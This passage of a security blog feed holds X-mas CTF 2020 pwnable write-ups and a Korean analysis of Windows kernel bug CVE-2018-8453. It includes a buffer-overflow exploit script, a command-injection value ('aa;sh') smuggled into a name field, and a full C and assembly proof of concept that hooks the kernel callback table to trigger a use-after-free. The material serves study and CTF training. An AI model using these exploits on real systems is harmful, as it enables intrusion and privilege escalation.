      <content:encoded><![CDATA[<center>2020 X-mas CTF Write-up </center><h1 id="Baby-Rudolph-pwnable"><a href="#Baby-Rudolph-pwnable" class="headerlink" title="Baby_Rudolph (pwnable)"></a>Baby_Rudolph (pwnable)</h1><h2 id="vulnerability"><a href="#vulnerability" class="headerlink" title="vulnerability"></a>vulnerability</h2><p><img src="https://user-images.githubusercontent.com/49066484/110240519-b180ef00-7f8f-11eb-96e2-089f6ad9c54f.png" alt="image"></p><p>There is Buffer Overflow in <code>vuln function</code>. It is triggered by calling <code>read</code>.</p><p><img src="https://user-images.githubusercontent.com/49066484/110240604-189ea380-7f90-11eb-9a28-53016a34540e.png" alt="image"></p><p>And Using <code>get_arm</code> function, we can get the sh. So it is easy bof. just overwrite retur address to <code>get_arm</code>.</p><span id="more"></span><p><img src="https://user-images.githubusercontent.com/49066484/110240678-6f0be200-7f90-11eb-9e34-da677cef49ef.png" alt="image"></p><p>We need ARM, because the binary  is for ARM architecture. So They gave docker. but it didn’t work. I used qemu for constructing  analysis environment.<br><code>/usr/bin/qemu-system-aarch64 -M virt -cpu cortex-a57 -m 128 -kernel ./kernel -initrd ./rootfs -nographic -serial mon:stdio -append console=ttyAMA0</code></p><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;host7.dreamhack.games&#x27;</span>,<span class="number">17341</span>)</span><br><span class="line">get_arm = <span class="number">0x400680</span></span><br><span class="line">argv = <span class="number">0x1225</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;\x90&#x27;</span>*<span class="number">72</span></span><br><span class="line">payload += p64(get_arm)</span><br><span class="line">payload += p64(argv)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;ARM...!\N&#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="Oil-System-pwnable"><a href="#Oil-System-pwnable" class="headerlink" title="Oil_System (pwnable)"></a>Oil_System (pwnable)</h1><h2 id="vulnerability-1"><a href="#vulnerability-1" class="headerlink" title="vulnerability"></a>vulnerability</h2><p>It opens the file with the name I entered. and also it uses <code>System</code> function when it opens the file.<br>(ex Syste(/home/~~))</p><p><img src="https://user-images.githubusercontent.com/49066484/110240852-36b8d380-7f91-11eb-8288-3655ddfe0783.png" alt="image"></p><p>When i entered the name, It called <code>check_upper_lower</code>function. But it only check whether the first character is lowercase or not. It means the name can contain <code>;</code> or <code>|</code> after first character. So we can use <code>command injection</code>.  if i  enter the name as A;/bin/sh, can get the sh.</p><h2 id="exploit-1"><a href="#exploit-1" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./oil&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Name : &#x27;</span> , <span class="string">&#x27;aa;sh&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Code : &#x27;</span>, <span class="string">&#x27;1 2 3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      <category domain="https://pwnkidhn.github.io/categories/Write-up/">Write-up</category>
      
      
      <category domain="https://pwnkidhn.github.io/tags/CTF/">CTF</category>
      
      <category domain="https://pwnkidhn.github.io/tags/pwnable/">pwnable</category>
      
      <category domain="https://pwnkidhn.github.io/tags/write-up/">write-up</category>
      
      
      <comments>https://pwnkidhn.github.io/2020/12/24/2020-12-25-XMAS_CTF_2020/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>CVE-2018-8453</title>
      <link>https://pwnkidhn.github.io/2020/12/02/2020-12-03-CVE-2018-8453/</link>
      <guid>https://pwnkidhn.github.io/2020/12/02/2020-12-03-CVE-2018-8453/</guid>
      <pubDate>Wed, 02 Dec 2020 15:00:00 GMT</pubDate>
      
      <description>&lt;center&gt;CVE-2018-8453 // Windows Kernel 1-day&lt;/center&gt; 


&lt;h1 id=&quot;Root-Cause&quot;&gt;&lt;a href=&quot;#Root-Cause&quot; class=&quot;headerlink&quot; title=&quot;Root Cause&quot;&gt;&lt;/a&gt;Root Cause&lt;/h1&gt;&lt;p&gt;NtUserSetWindowFNID()는 FNID를 설정할 때,  Window가 release 됐는지 아닌지 확인하지 않음.&lt;/p&gt;
&lt;p&gt;→ 따라서 이미 free된 Window에 FNID를 설정하여 재사용 할 수 있음.&lt;/p&gt;
&lt;p&gt;이 취약점을 이용하여, xxSBTrackInit()에서 pSBTrack의 UAF를 발생시킬 수 있음.&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<center>CVE-2018-8453 // Windows Kernel 1-day</center> <h1 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h1><p>NtUserSetWindowFNID()는 FNID를 설정할 때,  Window가 release 됐는지 아닌지 확인하지 않음.</p><p>→ 따라서 이미 free된 Window에 FNID를 설정하여 재사용 할 수 있음.</p><p>이 취약점을 이용하여, xxSBTrackInit()에서 pSBTrack의 UAF를 발생시킬 수 있음.</p><span id="more"></span><h1 id="Flow"><a href="#Flow" class="headerlink" title="Flow"></a>Flow</h1><p><img src="https://user-images.githubusercontent.com/75205011/100963586-01ec4900-356a-11eb-830e-b11ce5f2afc3.png" alt="sdafasdf"></p><ul><li>먼저 KernelCallbackTable에 있는 2개의 callback을 Hook함. (fnDWORD, fnClientFree…)</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">asm</span>.<span class="keyword">asm</span></span><br><span class="line">GetKernelCallbackTableBase PROC</span><br><span class="line">;<span class="keyword">int</span> <span class="number">3</span></span><br><span class="line">mov rax,gs:[<span class="number">60</span>h]</span><br><span class="line">lea rax,[rax+<span class="number">58</span>h]</span><br><span class="line">mov rax,[rax]</span><br><span class="line">ret</span><br><span class="line">GetKernelCallbackTableBase ENDP</span><br><span class="line"></span><br><span class="line">Main.<span class="function">c</span></span><br><span class="line"><span class="function"><span class="title">VirtualProtect</span><span class="params">(CallbackTb, <span class="number">512</span>, PAGE_READWRITE, &amp;OldProtect)</span></span>; <span class="comment">//메모리 보호 설정 값 변경</span></span><br><span class="line">CallbackTb += <span class="number">2</span>;   <span class="comment">//Table에서의 Hook할 Callback의 위치.</span></span><br><span class="line">fnDWORD = (fct_fnDispatch64)*CallbackTb;  <span class="comment">//Hook함수 설정.</span></span><br><span class="line">*CallbackTb = (ULONG64)fnDWORDCallBack;  </span><br><span class="line"></span><br><span class="line">CallbackTb += <span class="number">124</span>;</span><br><span class="line">fnClientFreeWindowClassExtraBytes = (fct_fnDispatch64)*CallbackTb;</span><br><span class="line">*CallbackTb = (ULONG64)fnClientFreeWindowClassExtraBytesCallBack; </span><br></pre></td></tr></table></figure><ul><li>Main Window와 ScrollBar 를 만듬.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Structure 설정.</span></span><br><span class="line">WNDCLASSEXW wcex;</span><br><span class="line">wcex.cbSize = <span class="keyword">sizeof</span>(WNDCLASSEX);</span><br><span class="line">wcex.style = CS_HREDRAW | CS_VREDRAW;</span><br><span class="line">wcex.lpfnWndProc = DefWindowProc;</span><br><span class="line">wcex.cbClsExtra = <span class="number">0</span>;</span><br><span class="line">wcex.cbWndExtra = <span class="number">4</span>;</span><br><span class="line">wcex.hInstance = <span class="number">0</span>;</span><br><span class="line">wcex.hIcon = LoadIcon(<span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">wcex.hCursor = LoadCursor(<span class="literal">NULL</span>, IDC_ARROW);</span><br><span class="line">wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW + <span class="number">1</span>);</span><br><span class="line">wcex.lpszMenuName = <span class="literal">NULL</span>;</span><br><span class="line">wcex.lpszClassName = <span class="string">L&quot;WNDCLASSMAIN&quot;</span>;</span><br><span class="line">wcex.hIconSm = LoadIcon(wcex.hInstance, <span class="literal">NULL</span>);</span><br><span class="line">RegisterClassExW(&amp;wcex);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Main Window 생성.</span></span><br><span class="line">hMainWND = CreateWindowW(<span class="string">L&quot;WNDCLASSMAIN&quot;</span>, <span class="string">L&quot;CVE&quot;</span>, WS_DISABLED, <span class="number">2</span>, <span class="number">2</span>, <span class="number">40</span>, <span class="number">40</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//ScrollBar 생성.</span></span><br><span class="line">hSBWND = CreateWindowEx(<span class="number">0</span>, <span class="string">&quot;ScrollBar&quot;</span>, <span class="string">&quot;SB&quot;</span>, WS_CHILD | WS_VISIBLE | SBS_HORZ, <span class="number">0</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">20</span>, hMainWND, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><ul><li><p>SendMessage()함수를 사용해 ScrollBar에 WM_LBUTTONDOWN 메시지를 보냄</p><p>  (이는 xxxSBTrackInit()함수 호출을 Trigger하기 위함)</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SendMessage(hSBWND, WM_LBUTTONDOWN, <span class="number">0</span>, <span class="number">0x00020002</span>);</span><br></pre></td></tr></table></figure><ul><li><p>xxxSBTrackLoop이 호출되어, 마우스 왼쪽 버튼이 해제되거나 다른 메시지가 수신될 때까지 루프에서 마우스 이벤트를 캡쳐함.</p></li><li><p>xxxSBTrackLoop이 실행되므로 fnDWORD가 Callback됨. (이때 미리 Hook한 fnDWORD가 실행됨)</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fnDWORDCallBack</span><span class="params">(PULONG64 msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (bMSGSENT &amp;&amp; *msg) &#123;</span><br><span class="line">bMSGSENT = FALSE;</span><br><span class="line">DestroyWindow(hMainWND); <span class="comment">//DestroyWindow함수를 이용해 Main Window를 파괴.</span></span><br><span class="line"><span class="comment">//DestroyWindow 함수는 xxxFreeWindow함수를 호출.</span></span><br><span class="line"><span class="comment">//xxxFreeWindow 함수는 먼저 Main Window의 FNID를 8000(free)으로 변경 함.</span></span><br><span class="line"><span class="comment">//그리고 xxxClientFreeWindowClassExtraBytes를 호출.</span></span><br><span class="line">&#125;</span><br><span class="line">fnDWORD(msg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>xxxClientFreeWindowClass..함수는 Callback를 호출 (이때 미리 Hook한 fnClinet…가 실행됨)</li></ul><p><img src="https://user-images.githubusercontent.com/75205011/100963641-247e6200-356a-11eb-8256-ac9c185b666c.png" alt="asd"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fnClientFreeWindowClassExtraBytesCallBack</span><span class="params">(PULONG64 msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (*(PULONG64)*((PULONG64)*(msg - <span class="number">11</span>)) == (ULONG64)hMainWND) &#123;</span><br><span class="line"></span><br><span class="line">hSBWNDnew = CreateWindowEx(<span class="number">0</span>, <span class="string">&quot;ScrollBar&quot;</span>, <span class="string">&quot;SB&quot;</span>, SWP_HIDEWINDOW | SB_HORZ, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">SetWindowFNID(hMainWND, <span class="number">0x2A1</span>); <span class="comment">//이미Free된 Main Window의 FNID(0x2A1 ~ 0x2AAA)를 설정함.</span></span><br><span class="line">SetCapture(hSBWNDnew); <span class="comment">//새로운 Window를 만들고, 이를 현재 thread에서 Capture하고 있는 window로 설정.</span></span><br><span class="line">f3 = TRUE;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line">fnClientFreeWindowClassExtraBytes(msg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Main Window가 파괴됐기 때문에 xxxSBTrackLoop이 돌아와 HMAssignmentUnLock(&amp;pSBTrack-&gt;spwndNotify)을 계속 실행하여 Main Window를 완전히 해제하는 관련 역참조를 수행하는데, 이로 인해 xxxFreeWindow가 다시 호출됨.</li></ul><p><img src="https://user-images.githubusercontent.com/75205011/100963660-306a2400-356a-11eb-8ecc-e28614b76662.png" alt="cdsf"></p><ul><li>Main Window의 FNID는 (xxxFreeWindow에서 8000(Free)되었다가,  fnClient..함수에서 82A1로 설정 되었음.) 따라서 SfnDWORD함수가 호출되며 이는 아까 hook했던 fnDWORD가 다시 호출됨.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fnDWORDCallBack</span><span class="params">(PULONG64 msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (bMSGSENT &amp;&amp; *msg) &#123;</span><br><span class="line">bMSGSENT = FALSE;</span><br><span class="line">DestroyWindow(hMainWND); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (*msg &amp;&amp; (*(msg + <span class="number">1</span>) == <span class="number">0x70</span>) &amp;&amp; (*((PULONG64)(*msg)) == (ULONG64)hMainWND)) &#123;</span><br><span class="line">SendMessage(hSBWNDnew, WM_CANCELMODE, <span class="number">0</span>, <span class="number">0</span>); <span class="comment">//여기서 WM_CANCELMODE를 사용하여,</span></span><br><span class="line"><span class="comment">//pSBTrack을 free함.</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fnDWORD(msg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>POC 프로그램은 단일 스레드이기 때문에 스레드에 의해 생성된 모든 창은 동일한 스레드 정보 구조를 가리킨다. SBTrack이 속해 있는 Scrollbar 창이 해제되었더라도, 동일한 스레드에 의해 새 창이 생성되는 한, pSBTrack은 여전히 동일한 창을 가리키고 있다.</li><li>setCaputure(hSBWNDNew)를 호출하여 hSBTWNDNDNew 창에서 마우스 이벤트를 캡처하기 위해 현재 스레드를 설정했다. 마지막으로, UserFreePool(pSBTrack)이 pSBTrack을 릴리스하기 위해 실행되어 HMAssignmentUnLock(&amp;pSBTrack-&gt;spwnd를 실행하기 전에 pSBTrack을 해제함SB) 및 결과 pSBTrack에 After Free.</li><li>Usermode에서 pSBTrack을 Free했다.</li><li>정상적인 흐름은  xxxSBTrackLoop가 끝난 후  xxxSBTrackInit()에서 Free 시켜야 하지만, 미리 UserMode에서 Free 해버렸으므로, 이후에 pSBTrack에 대한 UAF가 발생함.</li></ul><h1 id="Windbg-analyze"><a href="#Windbg-analyze" class="headerlink" title="Windbg !analyze"></a>Windbg !analyze</h1><p><img src="https://user-images.githubusercontent.com/75205011/100963679-3eb84000-356a-11eb-9045-821cd77c38ec.png" alt="asdf"></p><p><img src="https://user-images.githubusercontent.com/75205011/100963690-47107b00-356a-11eb-95b0-3e89d376161a.png" alt="xv"></p><h1 id="POC-code"><a href="#POC-code" class="headerlink" title="POC code."></a>POC code.</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Psapi.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;intrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;targetver.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">BOOLf3 = FALSE;</span><br><span class="line">BOOLbMSGSENT = FALSE;</span><br><span class="line">HWNDhMainWND;</span><br><span class="line">HWNDhSBWND;</span><br><span class="line">HWNDhSBWNDnew;</span><br><span class="line"></span><br><span class="line"><span class="function">EXTERN_C PULONG64 <span class="title">GetKernelCallbackTableBase</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function">EXTERN_C VOID <span class="title">SetWindowFNID</span><span class="params">(HWND hWnd, LONG64 FNID)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span>  <span class="title">ULONG64</span><span class="params">(WINAPI *fct_fnDispatch64)</span><span class="params">(PULONG64)</span></span>;</span><br><span class="line">fct_fnDispatch64 fnDWORD, fnClientFreeWindowClassExtraBytes;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fnDWORDCallBack</span><span class="params">(PULONG64 msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (bMSGSENT &amp;&amp; *msg) &#123;</span><br><span class="line">bMSGSENT = FALSE;</span><br><span class="line">DestroyWindow(hMainWND);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((f3==TRUE) &amp;&amp; (*(msg + <span class="number">1</span>) == <span class="number">0x70</span>) &amp;&amp; (*((PULONG64)(*msg)) == (ULONG64)hMainWND)) &#123;</span><br><span class="line"></span><br><span class="line">SendMessage(hSBWNDnew, WM_CANCELMODE, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">fnDWORD(msg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fnClientFreeWindowClassExtraBytesCallBack</span><span class="params">(PULONG64 msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (*(PULONG64)*((PULONG64)*(msg - <span class="number">11</span>)) == (ULONG64)hMainWND) &#123;</span><br><span class="line"></span><br><span class="line">hSBWNDnew = CreateWindowEx(<span class="number">0</span>, <span class="string">&quot;ScrollBar&quot;</span>, <span class="string">&quot;SB&quot;</span>, SWP_HIDEWINDOW | SB_HORZ, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">SetWindowFNID(hMainWND, <span class="number">0x2A1</span>);</span><br><span class="line">SetCapture(hSBWNDnew);</span><br><span class="line">f3 = TRUE;</span><br><span class="line">&#125; </span><br><span class="line">fnClientFreeWindowClassExtraBytes(msg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DWORDOldProtect = <span class="number">0</span>;</span><br><span class="line">PULONG64CallbackTb = GetKernelCallbackTableBase();</span><br><span class="line"></span><br><span class="line">VirtualProtect(CallbackTb, <span class="number">512</span>, PAGE_READWRITE, &amp;OldProtect);</span><br><span class="line">CallbackTb += <span class="number">2</span>;</span><br><span class="line">fnDWORD = (fct_fnDispatch64)*CallbackTb;</span><br><span class="line">*CallbackTb = (ULONG64)fnDWORDCallBack;</span><br><span class="line"></span><br><span class="line">CallbackTb += <span class="number">124</span>;</span><br><span class="line">fnClientFreeWindowClassExtraBytes = (fct_fnDispatch64)*CallbackTb;</span><br><span class="line">*CallbackTb = (ULONG64)fnClientFreeWindowClassExtraBytesCallBack;</span><br><span class="line"></span><br><span class="line">WNDCLASSEXW wcex;</span><br><span class="line">wcex.cbSize = <span class="keyword">sizeof</span>(WNDCLASSEX);</span><br><span class="line">wcex.style = CS_HREDRAW | CS_VREDRAW;</span><br><span class="line">wcex.lpfnWndProc = DefWindowProc;</span><br><span class="line">wcex.cbClsExtra = <span class="number">0</span>;</span><br><span class="line">wcex.cbWndExtra = <span class="number">4</span>;</span><br><span class="line">wcex.hInstance = <span class="number">0</span>;</span><br><span class="line">wcex.hIcon = LoadIcon(<span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">wcex.hCursor = LoadCursor(<span class="literal">NULL</span>, IDC_ARROW);</span><br><span class="line">wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW + <span class="number">1</span>);</span><br><span class="line">wcex.lpszMenuName = <span class="literal">NULL</span>;</span><br><span class="line">wcex.lpszClassName = <span class="string">L&quot;WNDCLASSMAIN&quot;</span>;</span><br><span class="line">wcex.hIconSm = LoadIcon(wcex.hInstance, <span class="literal">NULL</span>);</span><br><span class="line">RegisterClassExW(&amp;wcex); </span><br><span class="line"></span><br><span class="line">hMainWND = CreateWindowW(<span class="string">L&quot;WNDCLASSMAIN&quot;</span>, <span class="string">L&quot;CVE&quot;</span>, WS_DISABLED, <span class="number">2</span>, <span class="number">2</span>, <span class="number">40</span>, <span class="number">40</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">hSBWND = CreateWindowEx(<span class="number">0</span>, <span class="string">&quot;ScrollBar&quot;</span>, <span class="string">&quot;SB&quot;</span>, WS_CHILD | WS_VISIBLE | SBS_HORZ, <span class="number">0</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">20</span>, hMainWND, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">bMSGSENT = TRUE;</span><br><span class="line"></span><br><span class="line">SendMessage(hSBWND, WM_LBUTTONDOWN, <span class="number">0</span>, <span class="number">0x00020002</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> GetKernelCallbackTableBase</span><br><span class="line"><span class="keyword">public</span> FuncInt3</span><br><span class="line"><span class="keyword">public</span> SetWindowFNID </span><br><span class="line">_TEXT SEGMENT</span><br><span class="line"></span><br><span class="line">GetKernelCallbackTableBase PROC</span><br><span class="line">;<span class="keyword">int</span> <span class="number">3</span></span><br><span class="line">mov rax,gs:[<span class="number">60</span>h]</span><br><span class="line">lea rax,[rax+<span class="number">58</span>h]</span><br><span class="line">mov rax,[rax]</span><br><span class="line">ret</span><br><span class="line">GetKernelCallbackTableBase ENDP</span><br><span class="line"></span><br><span class="line">SetWindowFNID PROC</span><br><span class="line">mov r10,rcx;</span><br><span class="line">mov r11,rdx;</span><br><span class="line">mov eax,<span class="number">1095</span>h;</span><br><span class="line">syscall;</span><br><span class="line">ret;</span><br><span class="line">SetWindowFNID ENDP</span><br><span class="line"></span><br><span class="line">END</span><br></pre></td></tr></table></figure><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://bbs.pediy.com/thread-249021.htm">https://bbs.pediy.com/thread-249021.htm</a></p>]]></content:encoded>
      
      
      <category domain="https://pwnkidhn.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://pwnkidhn.github.io/tags/1-day/">1-day</category>
      
      <category domain="https://pwnkidhn.github.io/tags/Windows-Kernel/">Windows Kernel</category>
      
      <category domain="https://pwnkidhn.github.io/tags/UAF/">UAF</category>
      
      <category domain="https://pwnkidhn.github.io/tags/CVE/">CVE</category>
      
      
      <comments>https://pwnkidhn.github.io/2020/12/02/2020-12-03-CVE-2018-8453/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>CVE-2016-0728</title>
      <link>https://pwnkidhn.github.io/2020/11/02/2020-11-03-CVE-2016-0728/</link>
      <guid>https://pwnkidhn.github.io/2020/11/02/2020-11-03-CVE-2016-0728/</guid>
      <pubDate>Mon, 02 Nov 2020 15:00:00 GMT</pubDate>
      
      <description>&lt;center&gt;CVE-2016-0728 // Linux Kernel 1-day &lt;/center&gt;



